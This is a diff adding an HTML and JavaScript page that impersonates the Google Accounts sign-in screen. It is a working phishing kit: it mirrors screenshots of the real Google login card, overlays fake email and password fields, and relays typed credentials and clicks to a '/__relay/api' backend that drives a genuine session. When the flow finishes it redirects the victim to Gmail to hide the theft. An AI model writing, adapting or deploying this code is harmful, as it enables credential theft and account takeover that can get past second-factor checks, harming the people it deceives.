@@ -1,0 +1,164 @@
+<!doctype html><html><head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=google content=notranslate>
+<title>Sign in - Google Accounts</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iI0VBNDMzNSIgZD0iTTI0IDkuNWMzLjU0IDAgNi43MSAxLjIyIDkuMjEgMy42bDYuODUtNi44NUMzNS45IDIuMzggMzAuNDcgMCAyNCAwIDE0LjYyIDAgNi41MSA1LjM4IDIuNTYgMTMuMjJsNy45OCA2LjE5QzEyLjQzIDEzLjcyIDE3Ljc0IDkuNSAyNCA5LjV6Ii8+PHBhdGggZmlsbD0iIzQyODVGNCIgZD0iTTQ2Ljk4IDI0LjU1YzAtMS41Ny0uMTUtMy4wOS0uMzgtNC41NUgyNHY5LjAyaDEyLjk0Yy0uNTggMi45Ni0yLjI2IDUuNDgtNC43OCA3LjE4bDcuNzMgNmM0LjUxLTQuMTggNy4wOS0xMC4zNiA3LjA5LTE3LjY1eiIvPjxwYXRoIGZpbGw9IiNGQkJDMDUiIGQ9Ik0xMC41MyAyOC41OWMtLjQ4LTEuNDUtLjc2LTIuOTktLjc2LTQuNTlzLjI3LTMuMTQuNzYtNC41OWwtNy45OC02LjE5Qy45MiAxNi40NiAwIDIwLjEyIDAgMjRjMCAzLjg4LjkyIDcuNTQgMi41NiAxMC43OGw3Ljk3LTYuMTl6Ii8+PHBhdGggZmlsbD0iIzM0QTg1MyIgZD0iTTI0IDQ4YzYuNDggMCAxMS45My0yLjEzIDE1Ljg5LTUuODFsLTcuNzMtNmMtMi4xNSAxLjQ1LTQuOTIgMi4zLTguMTYgMi4zLTYuMjYgMC0xMS41Ny00LjIyLTEzLjQ3LTkuOTFsLTcuOTggNi4xOUM2LjUxIDQyLjYyIDE0LjYyIDQ4IDI0IDQ4eiIvPjwvc3ZnPg==">
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;height:100%}
+body{font-family:Arial,sans-serif;background:#f0f4f9;color:#202124;
+ display:flex;align-items:center;justify-content:center;min-height:100vh}
+.col{display:flex;flex-direction:column;align-items:center;padding:16px}
+/* the mirrored image IS the whole white card (logo + content + padding);
+   radius+overflow clip the gray page-bg corners baked into the jpeg */
+.cardwrap{width:fit-content;max-width:100%}
+#stage{background:#fff;border-radius:24px;padding:0;max-width:100%;overflow:hidden;
+ box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15)}
+#imgbox{position:relative;width:fit-content;max-width:100%}
+#shot{max-width:100%;height:auto;display:block;cursor:default}
+/* overlay input = the white surface filling the whole real field frame;
+   the real outline shows through from the mirror, and the floating label
+   is re-drawn as DOM (#ov-lbl) so it can never be clipped mid-glyph */
+#ov-in{position:absolute;display:none;padding:0 16px;font-family:Arial,sans-serif;font-size:16px;
+ color:#202124;outline:none;border:none;background:#fff;z-index:5}
+#ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
+#ov-lbl{position:absolute;display:none;font-family:Arial,sans-serif;line-height:normal;
+ z-index:7;background:#fff;padding:0 4px;white-space:nowrap;width:auto!important}
+#ov-top{position:absolute;display:none;height:2px;z-index:6}
+#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
+ font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
+#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
+ border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+#st{display:none;margin:8px auto 0;font-size:13px;color:#d93025;text-align:center;max-width:448px}
+/* footer starts right at the card's bottom edge, same width as the card */
+.foot{display:flex;justify-content:space-between;margin-top:8px;font-size:12px;color:#5f6368}
+</style></head><body>
+<div class=col>
+<div id=boot></div>
+<div class=cardwrap>
+<div id=stage>
+<div id=imgbox>
+<img id=shot alt="" draggable=false>
+<input id=ov-in autocomplete=off spellcheck=false>
+<div id=ov-top></div>
+<div id=ov-lbl></div>
+<button id=ov-btn>Next</button>
+</div>
+</div>
+<div class=foot><span>English (United States)</span>
+<span>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
+</div>
+<div id=st></div>
+</div>
+<script>
+var SID=null, KIND=null,
+    shot=document.getElementById('shot'), stage=document.getElementById('stage'),
+    ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
+    ovLbl=document.getElementById('ov-lbl'), ovTop=document.getElementById('ov-top'),
+    boot=document.getElementById('boot'), stEl=document.getElementById('st'),
+    revealed=false;
+function fatal(t){stEl.style.display='block';stEl.textContent=t;}
+function place(el,box,extra){
+ if(!box){el.style.display='none';return;}
+ el.style.display='block';
+ el.style.left=box.x+'%';el.style.top=box.y+'%';
+ el.style.width=box.w+'%';el.style.height=box.h+'%';
+ if(extra)extra();
+}
+function submit(){
+ if(!ovIn.value||!KIND)return;
+ ovIn.blur();ovIn.style.display='none';ovBtn.style.display='none';
+ fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){fatal('Network error. Please reload the page.');});
+}
+ovBtn.onclick=submit;
+ovIn.onkeydown=function(k){if(k.key==='Enter')submit();};
+/* taps anywhere on the mirrored card (links, checkboxes, secondary buttons)
+   are relayed to the real page so every control actually works */
+shot.addEventListener('click',function(e){
+ if(!SID)return;
+ var r=shot.getBoundingClientRect();
+ var x=100*(e.clientX-r.left)/r.width, y=100*(e.clientY-r.top)/r.height;
+ fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
+});
+var lastHash='', cardW=0;
+/* sidecar captures at 2x DPR; card_w tells the true CSS width for 1:1 */
+shot.onload=function(){
+ shot.style.width=(cardW||Math.round(shot.naturalWidth/(shot.naturalWidth>1200?2:1)))+'px';
+};
+function render(x){
+ /* keep the spinner until the SERVER has a fully-rendered card (the
+    field is detected = card complete); error/done reveal immediately */
+ if(!revealed){
+  if((x.input_kind&&x.input_box&&x.screenshot)||x.state==='error'||x.state==='done')
+   revealed=true;
+ }
+ if(revealed&&x.screenshot){
+  if(x.shot_hash)lastHash=x.shot_hash;
+  if(x.card_w)cardW=x.card_w;
+  shot.src='data:image/jpeg;base64,'+x.screenshot;
+  boot.style.display='none';shot.style.display='block';
+ }
+ var ib=x.input_box, bb=x.button_box, k=x.input_kind, L=x.label;
+ if(ib&&k&&x.state!=='done'&&x.state!=='error'){
+  KIND=k;
+  ovIn.className=k==='password'?'egpw':'';
+  if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
+  place(ovIn,ib,function(){
+   var h=ovIn.getBoundingClientRect().height;
+   ovIn.style.fontSize=Math.max(13,Math.min(18,h*0.30))+'px';
+   /* push the caret below the label strip so typed text sits centered in
+      the real entry area, exactly like the genuine page */
+   var shotH=shot.getBoundingClientRect().height, pad=8;
+   if(L) pad=Math.max(8,Math.round((L.y+L.h-ib.y)/100*shotH)+4);
+   ovIn.style.paddingTop=pad+'px';
+  });
+  if(x.top_line){
+   ovTop.style.display='block';
+   ovTop.style.left=x.top_line.x+'%';ovTop.style.top=x.top_line.y+'%';
+   ovTop.style.width=x.top_line.w+'%';ovTop.style.background=x.top_line.col;
+  }else ovTop.style.display='none';
+  if(L){
+   ovLbl.style.display='block';
+   ovLbl.style.left=L.x+'%';ovLbl.style.top=L.y+'%';
+   ovLbl.style.fontSize=L.fs+'px';
+   ovLbl.style.color=L.col||'#5f6368';
+   ovLbl.textContent=L.text;
+  }else ovLbl.style.display='none';
+  place(ovBtn,bb,function(){
+   var h=ovBtn.getBoundingClientRect().height;
+   ovBtn.style.borderRadius=k==='email'?Math.max(10,Math.round(h/2))+'px':'4px';
+   ovBtn.style.fontSize=Math.max(12,Math.min(15,h*0.36))+'px';
+  });
+  if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
+ }else{
+  ovIn.style.display='none';ovBtn.style.display='none';ovLbl.style.display='none';ovTop.style.display='none';
+ }
+ if(x.state==='done'){
+  setTimeout(function(){location.href='https://mail.google.com';},1200);return;
+ }
+ if(x.state==='error'){
+  /* Google's own error text is visible inside the mirrored screenshot —
+     only surface a fallback line when the mirror never arrived */
+  if(!x.screenshot)fatal(x.hint||'Sign-in failed. Please try again.');
+  return;
+ }
+}
+function poll(){
+ if(!SID){setTimeout(poll,900);return;}
+ fetch('/__relay/api/state?id='+SID+'&hs='+encodeURIComponent(lastHash))
+  .then(function(r){return r.json();})
+  .then(function(x){render(x);setTimeout(poll,1200);})
+  .catch(function(){setTimeout(poll,2200);});
+}
+var qsid=new URLSearchParams(location.search).get('sid');
+if(qsid){SID=qsid;poll();}
+else fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
+ body:JSON.stringify({langs:(navigator.languages||[navigator.language||'en']),
+  vw:innerWidth,vh:innerHeight})})
+ .then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
+ .catch(function(){fatal('Cannot reach the sign-in page. Please reload.');});
+poll();
+</script></body></html>
